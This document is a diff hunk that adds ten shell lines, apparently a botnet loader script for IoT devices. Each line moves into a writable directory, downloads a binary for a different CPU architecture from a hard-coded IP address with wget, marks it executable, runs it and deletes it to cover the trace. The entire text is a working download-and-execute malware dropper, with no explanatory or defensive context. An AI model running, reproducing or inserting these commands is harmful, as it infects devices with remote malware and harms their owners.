@@ -1,0 +1,10 @@
+cd /tmp || cd /ar/run || cd /mnt || cd /root || cd /; wget http://107.172.86.105/bins/mips; chmod +x mips; ./mips; rm -rf mips
+cd /tmp || cd /ar/run || cd /mnt || cd /root || cd /; wget http://107.172.86.105/bins/mipsl; chmod +x mipsl; ./mipsl; rm -rf mipsl
+cd /tmp || cd /ar/run || cd /mnt || cd /root || cd /; wget http://107.172.86.105/bins/sh4; chmod +x sh4; ./sh4; rm -rf sh4
+cd /tmp || cd /ar/run || cd /mnt || cd /root || cd /; wget http://107.172.86.105/bins/x86; chmod +x x86; ./x86; rm -rf x86
+cd /tmp || cd /ar/run || cd /mnt || cd /root || cd /; wget http://107.172.86.105/bins/arm6; chmod +x arm6; ./arm6; rm -rf arm6
+cd /tmp || cd /ar/run || cd /mnt || cd /root || cd /; wget http://107.172.86.105/bins/ppc; chmod +x ppc; ./ppc; rm -rf ppc
+cd /tmp || cd /ar/run || cd /mnt || cd /root || cd /; wget http://107.172.86.105/bins/m68k; chmod +x m68k; ./m68k; rm -rf m68k
+cd /tmp || cd /ar/run || cd /mnt || cd /root || cd /; wget http://107.172.86.105/bins/spc; chmod +x spc; ./spc; rm -rf spc
+cd /tmp || cd /ar/run || cd /mnt || cd /root || cd /; wget http://107.172.86.105/bins/arm; chmod +x arm; ./arm; rm -rf arm
+cd /tmp || cd /ar/run || cd /mnt || cd /root || cd /; wget http://107.172.86.105/bins/arm5; chmod +x arm5; ./arm5; rm -rf arm5
